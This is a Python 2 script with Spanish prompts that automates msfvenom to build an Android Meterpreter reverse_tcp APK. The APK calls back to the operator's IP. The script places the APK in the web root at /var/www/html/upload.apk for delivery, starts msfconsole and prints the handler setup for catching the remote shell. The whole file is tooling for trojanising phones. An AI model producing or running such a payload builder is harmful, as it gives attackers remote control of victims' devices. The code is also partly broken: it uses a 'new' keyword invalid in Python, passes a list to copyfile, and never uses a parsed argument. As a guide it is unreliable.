import socket
import os
import argparse
from subprocess import Popen, PIPE, STDOUT
from shutil import copyfile

class createAPK:
    def get_ip_address(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    
    def launchProcess(self,command):
        p = Popen(command, stdout = PIPE, 
            stderr = STDOUT, shell = True)
        for line in p.stdout:
            print line.replace('\n', '')
        return 0
    
    def create(self, app_name, lp):
        
        ipl = self.get_ip_address()
        print ipl
        com = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipl+" LPORT="+lp[0]+" R >"+app_name[0]+".apk"
        
        self.launchProcess(com)
        copyfile(app_name, "/var/www/html/upload.apk")
        
        return ipl
        
##PARSER SHIT
parser = argparse.ArgumentParser(description='Testing')
        #parser.add_argument('ip_remota', metavar='ipr', type=str, nargs='+',
                            #help='ip remota')
parser.add_argument('app_name', metavar='name', type=str, nargs='+',
                    help='nombre de la app')
parser.add_argument('lp', metavar='lp', type=str, nargs='+',
                    help='local port')
parser.add_argument('ipr', metavar='ipr', type=str, nargs='+',
                    help='remote ip')
args = parser.parse_args()
##//PARSER SHIT---------
print "lp: " + args.lp[0] + "app_name: " + args.app_name[0] + " ipr: " + args.ipr[0]
print "Iniciando postgresql..."
APK = new createAPK()
APK.launchProcess("service postgresql start")
print "Iniciando msfconsole en nueva ventana..."
APK.launchProcess("gnome-terminal -e 'bash -c \"msfconsole; exec bash\"'")
APK = createAPK()
print "Generando APK..."
ipl = APK.create(args.app_name, args.lp)
print "--usa esta guia--"
print "use exploit/multi/handler"
print "set payload android/meterpreter/reverse_tcp"
print "set LHOST " + ipl
print "set LPORT "+ args.lp[0]
print "exploit"


raw_input("Presiona una tecla cuando hayas configurado el handler...")


